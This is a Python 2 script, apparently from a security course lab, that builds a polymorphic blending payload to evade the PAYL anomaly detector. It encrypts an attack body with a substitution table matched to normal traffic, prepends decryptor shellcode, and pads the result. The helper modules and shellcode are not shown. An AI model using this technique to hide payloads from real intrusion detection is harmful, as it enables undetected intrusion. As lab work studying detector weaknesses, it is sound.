#!/usr/bin/env python2
import struct
from collections import Counter
from substitution import *
from padding import *

ARTIFICIAL_PATH = "artificial-profile.pcap"
ATTACKBODY_PATH = "tzhi3.pcap" # replace the file name by the one you downloaded

if __name__ == '__main__':
	# Read in source pcap file and extract tcp payload
	#TODO:ORIGINAL PAYLOADS!!MUST SWITCH BACK!
	attack_payload = getAttackBodyPayload(ATTACKBODY_PATH)
	artificial_payload = getArtificialPayload(ARTIFICIAL_PATH)

	#attack_payload = 'abbcccddddeeee'
	#artificial_payload = ''

	print('normal string',artificial_payload)
	print('attac string', attack_payload)

	# Generate substitution table based on byte frequency in file
	substitution_table = getSubstitutionTable(artificial_payload, attack_payload)

	# Substitution table will be used to encrypt attack body and generate corresponding xor_table which will be used to decrypt the attack body
	(xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)

	if len(attack_payload) <127:
		attack_payload=attack_payload.ljust(127,chr(0));
	# For xor operation, so supply to a multiple of 4

	while len(xor_table) < 128: #132:
		xor_table.append(chr(0))


	# For xor operation, should be a multiple of 4
	while len(adjusted_attack_body) < 128: #124: # CHECK: 124 can be some other number (multiple of 4) per your attack trace length
		adjusted_attack_body.append(chr(0))

	# Read in decryptor binary to append at the start of payload
	with open("shellcode.bin", mode='rb') as file:
		shellcode_content = file.read()


    # Prepare byte list for payload
	b_list = []
	for b in shellcode_content:
		b_list.append(b)

	print('adjusted attack body',adjusted_attack_body)


	# Raw payload will be constructed by encrypted attack body and xor_table
	raw_payload = b_list + adjusted_attack_body + xor_table


	while len(raw_payload) < len(artificial_payload):
	#for i in range(0,4):
		#print('original payload',len(raw_payload))
		padding(artificial_payload, raw_payload)
		#print('new payload',len(raw_payload))





	# Write prepared payload to Output file and test against your PAYL model
	with open("output", "w") as result_file:
		result_file.write(''.join(raw_payload))

